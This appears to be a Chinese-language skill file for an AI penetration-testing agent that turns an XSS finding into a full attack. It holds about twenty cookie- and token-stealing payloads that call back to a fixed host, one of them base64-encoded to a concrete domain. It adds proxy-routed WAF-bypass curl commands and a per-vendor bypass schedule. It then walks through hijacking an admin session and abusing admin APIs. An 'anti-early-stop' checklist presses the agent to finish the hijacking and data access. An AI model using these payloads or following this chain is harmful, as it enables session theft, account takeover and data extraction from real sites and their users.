---
name: xss-weaponization
description: XSS weaponization with forced //<XSS_CALLBACK_HOST>/1 callback, 15+ context-aware PoC variants, WAF bypass matrix, and session hijacking chain
version: 1.0.0
---

# XSS 武器化

## 适用场景

发现疑似 XSS 触发点后加载。覆盖 context 分析 → CSP 探测 → Cookie 标志检查 → payload 投递(回连固定 `//<XSS_CALLBACK_HOST>/1`) → 会话劫持 → 后台接管 → 同源 API 滥用完整链。

## 前置 skill

- waf-detection-and-fingerprinting (强制)
- waf-bypass-arsenal (强制)

## 回连地址 (固定,不可修改)

**所有 XSS PoC 的回连地址锁定为 `//<XSS_CALLBACK_HOST>/1`**。不允许使用任何其他外带域名。每个 PoC 输出末尾标注"回连地址: //<XSS_CALLBACK_HOST>/1"。

## 攻击链

### 1) 触发点识别 + context 分析

```bash
# 反射型探测 — 直连版
curl -sk "https://TARGET/search?q=cyberstrike123xss" | grep -i "cyberstrike123xss"

# 代理版
curl -sk --socks5-hostname <PROXY_USERNAME>:<PROXY_PASSWORD>@<PROXY_HOST>:2000 "https://TARGET/search?q=cyberstrike123xss" | grep -i "cyberstrike123xss"

# 工具扫描 — 直连版
katana -u https://TARGET -jc -d 3 -o /tmp/katana_urls.txt
dalfox url https://TARGET/search?q=test --skip-bav
```

Context 分类: HTML body / HTML 属性 / JavaScript 字符串 / JavaScript 模板 / CSS / URL / JSON / SVG / iframe / style

### 2) CSP 探测

```bash
curl -sI https://TARGET | grep -i content-security-policy
```

CSP 绕过策略: JSONP callback / 已允许 CDN 上的 gadget / unsafe-eval / unsafe-inline / nonce 重用 / base-uri 缺失 / data: 协议

### 3) Cookie 标志检查

```bash
curl -sI https://TARGET | grep -i set-cookie
```

检查: HttpOnly / Secure / SameSite / Path / Domain → 决定 cookie 外带可行性

### 4) Payload 投递 — 15+ PoC 变体 (回连地址: //<XSS_CALLBACK_HOST>/1)

#### Context A: HTML body — 无过滤

**PoC-01** script src 直接加载
```html
<script src=//<XSS_CALLBACK_HOST>/1></script>
```
回连地址: //<XSS_CALLBACK_HOST>/1

**PoC-02** img onerror + cookie 外带
```html
<img src=x onerror=fetch('//<XSS_CALLBACK_HOST>/1?c='+document.cookie)>
```
回连地址: //<XSS_CALLBACK_HOST>/1

**PoC-03** svg onload + cookie + localStorage + sessionStorage
```html
<svg/onload=fetch('//<XSS_CALLBACK_HOST>/1?d='+btoa(document.cookie+'|'+localStorage.getItem('token')+'|'+sessionStorage.getItem('session')))>
```
回连地址: //<XSS_CALLBACK_HOST>/1

#### Context B: HTML 属性闭合

**PoC-04** 双引号闭合 + 事件
```html
"><img src=x onerror=fetch('//<XSS_CALLBACK_HOST>/1?c='+document.cookie)>
```
回连地址: //<XSS_CALLBACK_HOST>/1

**PoC-05** 单引号闭合 + script
```html
'><script src=//<XSS_CALLBACK_HOST>/1></script>
```
回连地址: //<XSS_CALLBACK_HOST>/1

#### Context C: JavaScript 字符串

**PoC-06** 闭合 JS 字符串
```html
';fetch('//<XSS_CALLBACK_HOST>/1?c='+document.cookie)//
```
回连地址: //<XSS_CALLBACK_HOST>/1

**PoC-07** 模板字面量注入
```html
${fetch('//<XSS_CALLBACK_HOST>/1?c='+document.cookie)}
```
回连地址: //<XSS_CALLBACK_HOST>/1

#### Context D: SVG 内嵌

**PoC-08** SVG + script
```html
<svg><script>fetch('//<XSS_CALLBACK_HOST>/1?c='+document.cookie)</script></svg>
```
回连地址: //<XSS_CALLBACK_HOST>/1

#### Context E: iframe + data URI

**PoC-09** iframe data base64
```html
<iframe src="data:text/html;base64,PHNjcmlwdCBzcmM9Ly88WFNTX0NBTExCQUNLX0hPU1Q+LzE+PC9zY3JpcHQ+"></iframe>
```
回连地址: //<XSS_CALLBACK_HOST>/1

**PoC-10** iframe javascript 协议
```html
<iframe src="javascript:fetch('//<XSS_CALLBACK_HOST>/1?c='+parent.document.cookie)"></iframe>
```
回连地址: //<XSS_CALLBACK_HOST>/1

#### Context F: CSS injection

**PoC-11** CSS @import 外带
```html
<style>@import url('//<XSS_CALLBACK_HOST>/1?css=1');</style>
```
回连地址: //<XSS_CALLBACK_HOST>/1

#### Context G: URL context (href / src / action)

**PoC-12** javascript 协议
```html
javascript:fetch('//<XSS_CALLBACK_HOST>/1?c='+document.cookie)
```
回连地址: //<XSS_CALLBACK_HOST>/1

**PoC-13** 协议混淆
```html
java%0ascript:fetch('//<XSS_CALLBACK_HOST>/1?c='+document.cookie)
```
回连地址: //<XSS_CALLBACK_HOST>/1

#### Context H: JSON injection

**PoC-14** JSON 回显注入
```
{"name":"<img src=x onerror=fetch('//<XSS_CALLBACK_HOST>/1?c='+document.cookie)>"}
```
回连地址: //<XSS_CALLBACK_HOST>/1

#### Context I: WAF 绕过专用

**PoC-15** img hidden + createElement (盲打首选)
```html
<img src=x hidden onerror="s=createElement('script');body.appendChild(s);s.src='//<XSS_CALLBACK_HOST>/1';">
```
回连地址: //<XSS_CALLBACK_HOST>/1

**PoC-16** svg + atob 编码绕过
```html
<svg/onload=eval(atob('cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPScvLzxYU1NfQ0FMTEJBQ0tfSE9TVD4vMSc7'))>
```
回连地址: //<XSS_CALLBACK_HOST>/1

**PoC-17** charCode 编码绕过
```html
<img src=x onerror="document.write(String.fromCharCode(60,115,99,114,105,112,116,32,115,114,99,61,39,47,47,60,88,83,83,95,67,65,76,76,66,65,67,75,95,72,79,83,84,62,47,49,39,62,60,47,115,99,114,105,112,116,62))">
```
回连地址: //<XSS_CALLBACK_HOST>/1

**PoC-18** details + ontoggle
```html
<details open ontoggle=fetch('//<XSS_CALLBACK_HOST>/1?c='+document.cookie)>
```
回连地址: //<XSS_CALLBACK_HOST>/1

**PoC-19** body onload
```html
<body onload=fetch('//<XSS_CALLBACK_HOST>/1?c='+document.cookie)>
```
回连地址: //<XSS_CALLBACK_HOST>/1

**PoC-20** math + mXSS
```html
<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=fetch('//<XSS_CALLBACK_HOST>/1?c='+document.cookie)>
```
回连地址: //<XSS_CALLBACK_HOST>/1

### 5) 等待回传 + 提取数据

投递后等待 30-120 秒回传。提取: cookie / JWT / token / sessionStorage / localStorage / DOM 数据。

### 6) 后台路径探测

利用窃取的会话凭据探测管理后台: `/admin` `/manager` `/dashboard` `/backend` `/wp-admin` `/administrator`

### 7) 管理员会话劫持

用窃取的 cookie / token 登录管理后台,截图 + 记录权限范围。

### 8) 同源 API 滥用

以管理员身份调用至少 3 个高敏感 API 接口,获取 200 响应证据:
- 用户管理接口 (增删改查)
- 配置管理接口
- 数据导出接口
- 文件管理接口

## WAF 对抗集成

### Cloudflare XSS 绕过

```bash
# 优先用 PoC-16 (atob) / PoC-17 (charCode) / PoC-09 (iframe data)
# 直连版
curl -sk "https://TARGET/search?q=%3Csvg/onload%3Deval(atob('cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPScvL3dzcy50dy8xJzs%3D'))%3E"

# 代理版
curl -sk --socks5-hostname <PROXY_USERNAME>:<PROXY_PASSWORD>@<PROXY_HOST>:2000 "https://TARGET/search?q=%3Csvg/onload%3Deval(atob('cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPScvL3dzcy50dy8xJzs%3D'))%3E"
```

### 安全狗 / 360 XSS 绕过

```bash
# 优先用 PoC-17 (charCode) / PoC-15 (createElement) / PoC-16 (atob)
# 大小写 + 事件替换
curl -sk "https://TARGET/search?q=%3CiMg%20SrC%3Dx%20oNeRrOr%3Dfetch('//<XSS_CALLBACK_HOST>/1%3Fc%3D'%2Bdocument.cookie)%3E"
```

### 阿里云盾 XSS 绕过

```bash
# 优先用 PoC-16 (atob) / PoC-17 (charCode)
# 编码 + 短 payload
curl -sk -x http://<PROXY_USERNAME>:<PROXY_PASSWORD>@<PROXY_HOST>:1000 "https://TARGET/search?q=%3Csvg/onload%3Deval(atob('cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPScvL3dzcy50dy8xJzs%3D'))%3E"
```

### WAF 场景 Payload 调度表

| WAF 厂商 | 首选 PoC | 次选 | 第三选 | 速率 |
|----------|---------|------|-------|------|
| Cloudflare | PoC-16 (atob) | PoC-17 (charCode) | PoC-09 (iframe data) | ≤30 req/min |
| Akamai | PoC-09 (iframe data) | PoC-16 (atob) | PoC-17 (charCode) | ≤12 req/min |
| 阿里云盾 | PoC-16 (atob) | PoC-17 (charCode) | PoC-15 (createElement) | ≤40 req/min |
| 安全狗/360 | PoC-17 (charCode) | PoC-15 (createElement) | PoC-16 (atob) | ≤60 req/min |
| 长亭雷池 | PoC-16 (atob) | PoC-17 (charCode) | PoC-09 (iframe data) | ≤20 req/min |
| 宝塔 WAF | PoC-04 (闭合+大小写) | PoC-15 (createElement) | PoC-16 (atob) | ≤60 req/min |
| 未知 WAF | PoC-16 (atob) | PoC-15 (createElement) | PoC-09 (iframe data) | ≤30 req/min |

## 代理池启用判定

- WAF 识别卡片标记有 WAF → XSS payload 投递走代理
- 连续 3 次被拦截 → 切代理 + 升级绕过 Level
- 投递后等待回传阶段不需要代理 (被动等待)

## 敏感数据采集点

- 凭据类: Cookie / JWT / Token / Session / localStorage / sessionStorage
- 账户类: 管理员用户名 / 邮箱 / 手机号
- 系统类: 后台路径 / API 端点 / 配置信息
- 业务敏感: 管理员权限范围 / 用户数据 / 操作日志

## 失败处理

1. 反射点不在 HTML body → 切换对应 context 的 PoC
2. CSP 严格 → 尝试 CSP 绕过 (JSONP / nonce 重用 / base-uri)
3. HttpOnly cookie → 改为外带 localStorage / sessionStorage / DOM 数据
4. WAF 拦截 → 按调度表切换 PoC + 升级 Level
5. 30 分钟无回传 → 降级到下一个 PoC 重试

## 报告必填字段

- 漏洞标题
- 漏洞指纹
- 完整 PoC (必须含 `//<XSS_CALLBACK_HOST>/1`)
- WAF 类型 + 绕过路径
- 触发 context (HTML/属性/JS/URL/...)
- 回连证据 (外带的 cookie / token 截图)
- 后利用结果 (会话劫持 / API 滥用)
- 敏感数据清单
- 影响半径
- CVSS 3.1 + 向量串
- 修复建议
- 攻击时间线

## 反早停检查

1. 是否使用了 `//<XSS_CALLBACK_HOST>/1` 作为回连地址 (非其他)?
2. 是否完成了会话劫持 + 至少 3 个 API 滥用?
3. 是否在 WAF 场景下按调度表选择了正确的 PoC 变体?
